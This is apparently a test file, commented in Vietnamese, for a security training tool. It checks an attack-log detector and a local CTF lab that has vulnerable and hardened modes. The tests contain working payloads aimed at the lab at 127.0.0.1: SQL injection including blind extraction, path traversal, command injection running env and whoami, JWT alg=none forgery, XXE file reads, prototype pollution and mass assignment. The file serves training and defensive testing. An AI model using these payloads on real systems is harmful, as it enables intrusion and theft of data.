// Test detect.js (phân tích log thuần) + challenge.js + CTF lab (tích hợp).
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { analyzeLog, runDetect } from '../src/modules/detect.js';
import { listChallenges, submitFlag } from '../src/modules/challenge.js';
import { createLabApp } from '../src/lab/app.js';
import { SecurityError } from '../src/guard.js';

// ---------- analyzeLog (thuần) ----------

test('detect: nhận diện SQLi, XSS, traversal, scanner từ log tổng hợp', () => {
  const log = [
    { t: 1, method: 'GET', path: '/search?q=' + encodeURIComponent("' OR 1=1 --"), ua: 'Mozilla/5.0' },
    { t: 2, method: 'GET', path: '/search?q=%3Csvg/onload=alert(1)%3E', ua: 'Mozilla/5.0' },
    { t: 3, method: 'GET', path: '/download?name=../secrets.txt', ua: 'curl/8.0' },
    { t: 4, method: 'GET', path: '/admin', ua: 'Mozilla/5.0' },
    { t: 5, method: 'GET', path: '/', ua: 'sqlmap/1.7' },
    { t: 6, method: 'GET', path: '/login', ua: 'python-requests/2.31' },
  ];
  const r = analyzeLog(log);
  assert.equal(r.totalRequests, 6);
  assert.ok(r.attacksDetected >= 4);
  const types = r.findings.map((f) => f.type);
  assert.ok(types.includes('sqli'));
  assert.ok(types.includes('xss'));
  assert.ok(types.includes('traversal'));
  assert.ok(types.includes('admin-probe'));
  assert.ok(types.includes('scanner'));
  // mỗi phát hiện phải kèm biện pháp phòng thủ
  for (const f of r.findings) assert.ok(f.defense.length > 20);
  // sqli đứng trước xss (high được sort ổn định)
  assert.equal(r.findings[0].severity, 'high');
});

test('detect: log sạch → 0 phát hiện, không Crash', () => {
  const r = analyzeLog([
    { t: 1, method: 'GET', path: '/', ua: 'Mozilla/5.0' },
    { t: 2, method: 'GET', path: '/search?q=alice', ua: 'Mozilla/5.0' },
  ]);
  assert.equal(r.attacksDetected, 0);
  assert.deepEqual(r.findings, []);
});

test('detect: log rác/không phải mảng → không Crash', () => {
  assert.equal(analyzeLog(null).totalRequests, 0);
  assert.equal(analyzeLog('x').totalRequests, 0);
});

test('detect: nhận diện cmdinj, open-redirect, XXE, upload, JWT probe', () => {
  const log = [
    { t: 1, method: 'GET', path: '/tools/ping?host=' + encodeURIComponent('127.0.0.1 & whoami'), ua: 'x', ip: '127.0.0.1' },
    { t: 2, method: 'GET', path: '/redirect?to=' + encodeURIComponent('https://evil.example'), ua: 'x', ip: '127.0.0.1' },
    { t: 3, method: 'POST', path: '/api/import', ua: 'x', ip: '127.0.0.1' },
    { t: 4, method: 'POST', path: '/upload', ua: 'x', ip: '127.0.0.1' },
    { t: 5, method: 'GET', path: '/api/profile?token=abc.def.ghi', ua: 'x', ip: '127.0.0.1' },
  ];
  const r = analyzeLog(log);
  const types = r.findings.map((f) => f.type);
  assert.ok(types.includes('cmdinj'), 'phải nhận cmdinj');
  assert.ok(types.includes('open-redir'), 'phải nhận open-redir');
  assert.ok(types.includes('xxe'), 'phải nhận xxe');
  assert.ok(types.includes('upload-abuse'), 'phải nhận upload-abuse');
  assert.ok(types.includes('jwt-probe'), 'phải nhận jwt-probe');
});

test('detect: brute-force — ≥5 POST /login từ cùng IP', () => {
  const log = Array.from({ length: 6 }, (_, i) => ({ t: i, method: 'POST', path: '/login', ua: 'x', ip: '10.0.0.9' }));
  const r = analyzeLog(log);
  const bf = r.findings.find((f) => f.type === 'brute-force');
  assert.ok(bf, 'phải phát hiện brute-force');
  assert.match(bf.samples[0], /10\.0\.0\.9/);
  // dưới ngưỡng → không phát hiện
  const few = analyzeLog(Array.from({ length: 3 }, (_, i) => ({ t: i, method: 'POST', path: '/login', ua: 'x', ip: '10.0.0.9' })));
  assert.ok(!few.findings.some((f) => f.type === 'brute-force'));
});

test('detect: pattern LAB-16..20 — proto/mass/blind/reset đều bắt trên path đã encode', () => {
  const log = [
    { t: 1, method: 'POST', path: '/api/config', ua: 'x', ip: '10.0.0.1' },
    { t: 2, method: 'POST', path: '/api/register?role=admin', ua: 'x', ip: '10.0.0.1' },
    // path TRONG LOG là raw/encoded — %27 thay ', %20 thay space
    { t: 3, method: 'GET', path: '/track?code=AB-100%27%20AND%201%3D1%20--', ua: 'x', ip: '10.0.0.1' },
    { t: 4, method: 'GET', path: "/track?code=AB-100' AND substr(flag,1,1)='F' --", ua: 'x', ip: '10.0.0.1' },
    { t: 5, method: 'GET', path: '/api/reset/request?user=alice', ua: 'x', ip: '10.0.0.1' },
    // benign — không được bắt nhầm
    { t: 6, method: 'GET', path: '/track?code=AB-100', ua: 'x', ip: '10.0.0.1' },
    { t: 7, method: 'GET', path: '/api/register', ua: 'x', ip: '10.0.0.1' },
  ];
  const types = analyzeLog(log).findings.map((f) => f.type);
  assert.ok(types.includes('mass-assign'), 'mass-assign phải bắt ?role=admin');
  assert.ok(types.includes('blind-sqli'), 'blind-sqli phải bắt cả path %20-encoded lẫn raw');
  assert.ok(types.includes('reset-probe'), 'reset-probe phải bắt /api/reset/');
});

// ---------- CTF tích hợp: vuln giải được, hardened chặn ----------

let vulnServer;
let vulnUrl;
let hardServer;
let hardUrl;

before(async () => {
  vulnServer = await createLabApp({ mode: 'vuln', rateLimit: { capacity: 500, refillPerSec: 1000 } });
  await new Promise((r) => vulnServer.listen(0, '127.0.0.1', r));
  vulnUrl = `http://127.0.0.1:${vulnServer.address().port}`;
  hardServer = await createLabApp({ mode: 'hardened', rateLimit: { capacity: 500, refillPerSec: 1000 } });
  await new Promise((r) => hardServer.listen(0, '127.0.0.1', r));
  hardUrl = `http://127.0.0.1:${hardServer.address().port}`;
});

after(() => {
  vulnServer.close();
  hardServer.close();
});

test('CTF: liệt kê 10 thử thách, tổng 265 điểm, cờ per-instance', async () => {
  const list = await listChallenges(vulnUrl);
  assert.equal(list.enabled, true);
  assert.equal(list.challenges.length, 10);
  assert.equal(list.total, 265);
  assert.ok(list.challenges.every((c) => /FLAG|traversal|SQL|apiKey|admin|SECLAB|jwt|file|track|proto|role|md5/i.test(c.hint)));
});

test('CTF: cờ khác nhau giữa hai phiên lab khác nhau', async () => {
  const a = await fetch(vulnUrl + '/api/users/4').then((r) => r.json());
  const hardServer2 = await createLabApp({ mode: 'vuln' });
  await new Promise((r) => hardServer2.listen(0, '127.0.0.1', r));
  const b = await fetch(`http://127.0.0.1:${hardServer2.address().port}/api/users/4`).then((r) => r.json());
  hardServer2.close();
  assert.notEqual(a.apiKey, b.apiKey, 'cờ IDOR phải khác nhau giữa các phiên');
});

test('CTF: SQLi dump lộ người dùng ẩn mang cờ trong email', async () => {
  const res = await fetch(vulnUrl + `/search?q=${encodeURIComponent("' OR 1=1 --")}`);
  const body = await res.text();
  const m = body.match(/FLAG\{sqli-[0-9a-f]+\}/);
  assert.ok(m, 'phải lộ FLAG{sqli-...} khi dump 1=1');
});

test('CTF: traversal đọc được flag-ctf.txt ở GỐC (không nằm trong listing)', async () => {
  const listing = await (await fetch(vulnUrl + '/files')).text();
  assert.ok(!listing.includes('flag-ctf.txt'), 'cờ không được xuất hiện trong /files listing');
  const res = await fetch(vulnUrl + '/download?name=../flag-ctf.txt');
  const t = await res.text();
  assert.match(t, /FLAG\{trav-[0-9a-f]+\}/);
});

test('CTF: admin flag nằm ngay trang /admin vuln', async () => {
  const t = await (await fetch(vulnUrl + '/admin')).text();
  assert.match(t, /FLAG\{admin-[0-9a-f]+\}/);
});

test('CTF: nộp đúng cờ → điểm tăng; nộp sai → ok=false', async () => {
  const list = await listChallenges(vulnUrl);
  const admin = await (await fetch(vulnUrl + '/admin')).text();
  const flag = admin.match(/FLAG\{admin-[0-9a-f]+\}/)[0];
  const wrong = await submitFlag(vulnUrl, 4, 'FLAG{admin-deadbeef}');
  assert.equal(wrong.ok, false);
  const right = await submitFlag(vulnUrl, 4, flag);
  assert.equal(right.ok, true);
  assert.equal(right.score, 20);
  // nộp lại → vẫn ok, idempotent
  const again = await submitFlag(vulnUrl, 4, flag);
  assert.equal(again.ok, true);
  assert.equal(again.score, 20);
  assert.ok(list.total === 265);
});

test('CTF #5: command injection đọc được cờ trong biến môi trường', async () => {
  const sep = process.platform === 'win32' ? '&' : ';';
  const cmd = process.platform === 'win32' ? 'set SECLAB' : 'env';
  const res = await fetch(vulnUrl + `/tools/ping?host=${encodeURIComponent(`127.0.0.1 ${sep} ${cmd}`)}`);
  const body = await res.text();
  assert.match(body, /FLAG\{cmd-[0-9a-f]+\}/);
});

test('CTF #6: JWT alg=none và secret yếu đều lấy được cờ ctfsvc', async () => {
  const { jwtSign } = await import('../src/lab/jwtx.js');
  for (const forged of [jwtSign({ sub: 'ctfsvc', role: 'svc' }, '', { alg: 'none' }), jwtSign({ sub: 'ctfsvc', role: 'svc' }, 'secret123')]) {
    const j = await (await fetch(vulnUrl + '/api/profile?token=' + encodeURIComponent(forged))).json();
    assert.match(j.flag || '', /FLAG\{jwt-[0-9a-f]+\}/);
  }
  // token thật của alice (không phải ctfsvc) KHÔNG lộ cờ — phải forge mới có
  const tok = await (
    await fetch(vulnUrl + '/api/token', {
      method: 'POST',
      headers: { 'content-type': 'application/x-www-form-urlencoded' },
      body: 'username=alice&password=alice123',
    })
  ).json();
  const legit = await (await fetch(vulnUrl + '/api/profile?token=' + encodeURIComponent(tok.token))).json();
  assert.equal(legit.flag, undefined);
});

test('CTF #7: XXE entity đọc flag-xxe.txt trên filesystem ảo', async () => {
  const res = await fetch(vulnUrl + '/api/import', {
    method: 'POST',
    body: '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag-xxe.txt">]><i><item>&x;</item></i>',
  });
  const j = await res.json();
  assert.match(j.items[0], /FLAG\{xxe-[0-9a-f]+\}/);
});

test('CTF #8: prototype pollution làm lộ cờ ở GET /api/config', async () => {
  const clean = await (await fetch(vulnUrl + '/api/config')).json();
  assert.equal(clean.flag, undefined, 'chưa pollute không được có cờ');
  await fetch(vulnUrl + '/api/config', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: '{"__proto__":{"isAdmin":true}}',
  });
  const j = await (await fetch(vulnUrl + '/api/config')).json();
  assert.ok(j.protoPolluted.includes('isAdmin'));
  assert.match(j.flag, /FLAG\{proto-[0-9a-f]+\}/);
  // side effect nhiễm thật trên prototype toàn cục của process lab
  assert.equal({}.isAdmin, true);
  delete Object.prototype.isAdmin; // dọn cho các test sau
});

test('CTF #9: mass assignment tự set role=admin → /api/me trả cờ', async () => {
  const reg = await fetch(vulnUrl + '/api/register?role=admin', {
    method: 'POST',
    headers: { 'content-type': 'application/x-www-form-urlencoded' },
    body: 'username=ctfhacker&password=pw12345',
  });
  const j = await reg.json();
  assert.equal(j.user.role, 'admin');
  const login = await fetch(vulnUrl + '/login', {
    method: 'POST',
    headers: { 'content-type': 'application/x-www-form-urlencoded' },
    body: 'username=ctfhacker&password=pw12345',
  });
  const sid = (login.headers.get('set-cookie') || '').match(/session=([a-f0-9]+)/)?.[1];
  const me = await (await fetch(vulnUrl + '/api/me', { headers: { cookie: `session=${sid}` } })).json();
  assert.match(me.flag, /FLAG\{mass-[0-9a-f]+\}/);
});

test('CTF #10: blind SQLi rút cờ từng ký tự qua oracle /track', async () => {
  // oracle: 200 "TỒN TẠI" vs 404 — xác nhận
  const yes = await fetch(vulnUrl + `/track?code=${encodeURIComponent("AB-100' AND 1=1 --")}`);
  const no = await fetch(vulnUrl + `/track?code=${encodeURIComponent("AB-100' AND 1=2 --")}`);
  assert.equal(yes.status, 200);
  assert.match(await yes.text(), /TỒN TẠI/);
  assert.equal(no.status, 404);
  // rút 4 ký tự đầu cờ (FLAG) + vị trí 6-10 là "blind-"
  const probe = async (n, ch) => {
    const q = `AB-100' AND (SELECT substr(flag,${n},1) FROM ctf_blind)='${ch}' --`;
    const r = await fetch(vulnUrl + `/track?code=${encodeURIComponent(q)}`);
    return r.status === 200;
  };
  for (const [n, ch] of [[1, 'F'], [2, 'L'], [5, '{'], [10, 'd']]) {
    assert.ok(await probe(n, ch), `substr(flag,${n}) phải là '${ch}'`);
  }
  assert.equal(await probe(1, 'Z'), false);
});

test('CTF: hardened TẮT — /_lab/challenges enabled:false và verify 403', async () => {
  const list = await listChallenges(hardUrl);
  assert.equal(list.enabled, false);
  const res = await fetch(hardUrl + '/_lab/verify?id=1&flag=FLAG{sqli-anything}');
  assert.equal(res.status, 403);
  const j = await res.json();
  assert.match(j.message, /đã vá/);
});

test('CTF: hardened không lộ cờ ở /admin, /api/users/4 cần phiên', async () => {
  const t = await (await fetch(hardUrl + '/admin')).text();
  assert.ok(!t.includes('FLAG{'));
  assert.equal((await fetch(hardUrl + '/api/users/4')).status, 401);
});

test('CTF: /_lab/log trả log request thật (mảng có entry)', async () => {
  await fetch(vulnUrl + '/');
  const j = await (await fetch(vulnUrl + '/_lab/log')).json();
  assert.ok(Array.isArray(j.log) && j.log.length > 0);
  assert.ok(j.log[0].path);
});

test('detect: runDetect chặn mục tiêu public như mọi module', async () => {
  await assert.rejects(() => runDetect('http://93.184.216.34/'), SecurityError);
});
